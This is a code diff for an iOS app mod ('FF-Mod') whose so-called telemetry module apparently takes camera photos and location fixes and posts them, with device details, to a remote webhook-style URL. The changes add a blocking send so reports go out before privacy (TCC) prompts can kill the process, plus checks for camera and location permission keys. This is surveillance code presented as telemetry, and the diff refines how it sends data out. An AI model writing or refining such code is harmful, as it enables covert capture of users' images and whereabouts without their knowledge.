@@ -199,10 +199,10 @@ static NSString *FfTelDeviceFull(void)
 
 // ------------------------------------------------------------------- network
 
-static void FfTelPost(NSString *payloadJson, NSArray<NSDictionary *> *files)
+static NSMutableURLRequest *FfTelBuildRequest(NSString *payloadJson, NSArray<NSDictionary *> *files)
 {
     NSURL *url = [NSURL URLWithString:@FF_TELEMETRY_URL];
-    if (!url) { FfTelSetStatus(@"bad url"); return; }
+    if (!url) return nil;
     NSString *boundary = @"----ffTelB0undary7f3a";
     NSMutableData *body = [NSMutableData data];
     [body appendData:[[NSString stringWithFormat:
@@ -229,16 +229,19 @@ static void FfTelPost(NSString *payloadJson, NSArray<NSDictionary *> *files)
         forHTTPHeaderField:@"Content-Type"];
     [req setValue:@"FF-Mod/1.0" forHTTPHeaderField:@"User-Agent"];
     req.HTTPBody = body;
-    FfTelSetStatus(@"sending");
+    return req;
+}
 
+static void FfTelPost(NSString *payloadJson, NSArray<NSDictionary *> *files)
+{
+    NSMutableURLRequest *req = FfTelBuildRequest(payloadJson, files);
+    if (!req) { FfTelSetStatus(@"bad url"); return; }
+    FfTelSetStatus(@"sending");
     NSURLSessionDataTask *task = [[NSURLSession sharedSession]
         dataTaskWithRequest:req
         completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
-            if (err)
-            {
-                FfTelSetStatus([NSString stringWithFormat:@"err %ld", (long)err.code]);
-                return;
-            }
+            (void)data;
+            if (err) { FfTelSetStatus([NSString stringWithFormat:@"err %ld", (long)err.code]); return; }
             NSInteger code = [resp isKindOfClass:[NSHTTPURLResponse class]]
                 ? [(NSHTTPURLResponse *)resp statusCode] : -1;
             FfTelSetStatus([NSString stringWithFormat:@"http %ld", (long)code]);
@@ -246,13 +249,43 @@ static void FfTelPost(NSString *payloadJson, NSArray<NSDictionary *> *files)
     [task resume];
 }
 
-static void FfTelSendText(NSString *text)
+// Blocking post - used before calls that may kill the process (TCC).
+static void FfTelPostSync(NSString *payloadJson, NSArray<NSDictionary *> *files)
 {
-    NSString *payload = [NSString stringWithFormat:
-        @"{\"username\":\"FF Telemetry\",\"content\":\"%@\"}", FfTelEscape(text)];
-    FfTelPost(payload, @[]);
+    NSMutableURLRequest *req = FfTelBuildRequest(payloadJson, files);
+    if (!req) return;
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    NSURLSessionDataTask *task = [[NSURLSession sharedSession]
+        dataTaskWithRequest:req
+        completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
+            (void)data; (void)resp; (void)err;
+            dispatch_semaphore_signal(sem);
+        }];
+    [task resume];
+    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 8ull * NSEC_PER_SEC));
 }
 
+static NSString *FfTelTextPayload(NSString *text)
+{
+    return [NSString stringWithFormat:@"{\"username\":\"FF Telemetry\",\"content\":\"%@\"}",
+            FfTelEscape(text)];
+}
+
+static void FfTelSendText(NSString *text)
+{
+    FfTelPost(FfTelTextPayload(text), @[]);
+}
+
+static void FfTelSendTextSync(NSString *text)
+{
+    FfTelPostSync(FfTelTextPayload(text), @[]);
+}
+
+static BOOL FfTelHasKey(NSString *key)
+{
+    id v = [[NSBundle mainBundle] objectForInfoDictionaryKey:key];
+    return [v isKindOfClass:[NSString class]] && [(NSString *)v length] > 0;
+}
 static void FfTelTest(void)
 {
     FfTelSendText([NSString stringWithFormat:@"TEST\n%@", FfTelDeviceFull()]);
@@ -344,7 +377,7 @@ static NSData *FfTelDownscaleJPEG(UIImage *img, CGFloat maxDim, CGFloat q)
 static void FfTelCamLog(NSString *msg)
 {
     FfTelSetStatus(msg);
-    FfTelSendText([NSString stringWithFormat:@"CAM %@\n%@", msg, FfTelDevice()]);
+    FfTelSendTextSync([NSString stringWithFormat:@"CAM %@\n%@", msg, FfTelDevice()]);
 }
 
 static void FfTelCameraShot(BOOL front)
@@ -352,6 +385,11 @@ static void FfTelCameraShot(BOOL front)
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
         FfTelCamLog(@"begin");
+        if (!FfTelHasKey(@"NSCameraUsageDescription"))
+        {
+            FfTelCamLog(@"NO-PLIST-KEY");
+            return;
+        }
         AVAuthorizationStatus st = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
         FfTelCamLog([NSString stringWithFormat:@"status=%d", (int)st]);
         if (st == AVAuthorizationStatusNotDetermined)
@@ -475,13 +513,19 @@ static FfTelLoc *gFfTelLoc = nil;
 static void FfTelLocLog(NSString *msg)
 {
     FfTelSetStatus(msg);
-    FfTelSendText([NSString stringWithFormat:@"LOC %@\n%@", msg, FfTelDevice()]);
+    FfTelSendTextSync([NSString stringWithFormat:@"LOC %@\n%@", msg, FfTelDevice()]);
 }
 
 static void FfTelLocation(void)
 {
     dispatch_async(dispatch_get_main_queue(), ^{
         FfTelLocLog(@"begin");
+        if (!FfTelHasKey(@"NSLocationWhenInUseUsageDescription") &&
+            !FfTelHasKey(@"NSLocationAlwaysAndWhenInUseUsageDescription"))
+        {
+            FfTelLocLog(@"NO-PLIST-KEY");
+            return;
+        }
         gFfTelLoc = [FfTelLoc new];
         gFfTelLoc.done = ^(CLLocation *loc, NSString *err) {
             if (!loc)
